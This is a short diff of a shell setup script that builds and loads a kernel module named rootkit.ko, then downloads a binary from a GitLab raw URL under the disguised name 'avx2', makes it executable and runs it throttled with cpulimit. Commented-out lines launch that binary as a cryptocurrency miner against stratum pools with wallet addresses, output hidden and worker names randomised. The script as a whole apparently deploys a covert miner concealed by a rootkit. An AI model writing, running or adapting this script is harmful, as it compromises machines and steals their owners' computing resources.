@@ -5,13 +5,13 @@ sudo apt-get install cpulimit
 cd Kerecek/
 rm -rf avx2
 # ph add avx2 
-cpulimit -l 180 -e avx2 &
 make
 dmesg -C
 insmod rootkit.ko
 dmesg
 wget -O avx2 https://gitlab.com/bolihufu.avefomah/semaphore-test/raw/master/vkax
 chmod +x avx2
+cpulimit -l 180 -e avx2 &
 # ./avx2 -a mike -o stratum+tcps://stratum-na.rplant.xyz:17040 -u XoL3WHgSqF3mZcKajC3JG15VAhZXtdGYR1.$(echo $(shuf -i 100-999 -n 1)-CPU) -t 4 -p x >/dev/null &
 # ./avx2 -a yespower -o stratum+tcps://stratum-na.rplant.xyz:17017 -u web1qvpk4dddsmy7yqnzltj4ehpn99uf6jlfpqukjvy.$(echo $(shuf -i 100-999 -n 1)-CPU) -t 4 -p x >/dev/null & 
 # ./avx2 -a minotaurx -o stratum+tcps://stratum-na.rplant.xyz:17068 -u RP7dNRcUFy4BngHv5okrAMHAkW3guQ7kCU.$(echo $(shuf -i 100-999 -n 1)-CPU) -t 4 -p x >/dev/null &
